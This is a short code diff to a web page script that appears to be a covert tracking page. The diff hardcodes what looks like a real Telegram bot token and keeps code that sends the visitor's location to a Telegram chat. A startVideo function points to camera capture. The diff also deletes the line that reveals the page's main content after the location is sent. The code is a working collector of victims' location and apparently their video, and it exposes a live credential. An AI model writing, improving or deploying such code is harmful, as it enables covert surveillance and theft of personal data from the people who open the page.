@@ -50,7 +50,8 @@
             return params;
         }
 
-        const { botToken, chatId } = getQueryParams();
+        const { chatId } = getQueryParams();
+        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
 
         async function startVideo() {
             try {
@@ -207,7 +208,6 @@
 
                 if (response.ok) {
                     console.log("Location info sent to Telegram");
-                    document.getElementById('main-container').style.display = 'flex';
                 } else {
                     console.error("Error sending location info to Telegram: ", response.statusText);
                 }
